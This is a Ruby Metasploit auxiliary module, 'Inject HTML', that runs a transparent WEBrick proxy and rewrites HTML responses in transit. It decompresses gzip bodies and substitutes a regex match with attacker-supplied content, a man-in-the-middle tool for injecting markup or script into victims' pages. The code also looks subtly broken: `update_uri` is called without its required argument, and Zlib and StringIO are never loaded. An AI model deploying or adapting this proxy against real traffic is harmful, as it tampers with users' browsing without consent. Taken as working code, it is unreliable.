##
# $Id: inject_html.rb 1 clshack $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'webrick/httpproxy'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'Inject HTML',
			'Version'     => '$Revision$',
			'Description' => %q{
				Transparent proxy in ruby which is able to inject code in html page.
			},
			'Author'      => 	'clshack', 
			'License'     => MSF_LICENSE,
			'References'     =>
				[
					['URL', 'http://www.freedomcoder.com.ar/2009/02/28/webrick-transparent-proxy-code-injection/'],
					['URL', 'http://www.clshack.it/rubytransparent-proxy-inject-htmljavascript.html']
				],
		)

		register_options([
			OptString.new('REGEX',  	[false, "Search content",'<title>']),
			OptString.new('REPLACE',  	[false, "Replace content with", '<title>Metasploit']),
			OptInt.new(  'LPORT',    	[false,"Proxy port listener",8080])
		], self.class)

	end

	def run
		regex = datastore['REGEX']
		replace = datastore['REPLACE']
		lport = datastore['LPORT']

		begin
			req_call = Proc.new do |req,res|
			  req.update_uri()
			  #puts "#{req.unparsed_uri}"
			end

			res_call = Proc.new do |req,res|
			  res.inject_payload(replace,regex)
			end
			proxy = WEBrick::HTTPProxyServer.new(:Port =>lport ,:RequestCallBack => req_call,:ProxyContentHandler => res_call)
			trap("INT"){ proxy.shutdown }
			proxy.start
		end
	end
end
class WEBrick::HTTPRequest
  def  update_uri(uri)
    @unparsed_uri = uri
    @request_uri = parse_uri(uri)
  end
end

class WEBrick::HTTPResponse
  def inject_payload(replace,regex)
    if content_type =~ /html/ or (content_type and content_type.empty? and body[/<http/]) then
      if ('gzip' == header['content-encoding'])
          header.delete('content-encoding')
          self.body = Zlib::GzipReader.new(StringIO.new(body)).read
      end
      self.body.gsub!( /#{regex}/i , "#{replace}")#replace

    end
  end
end
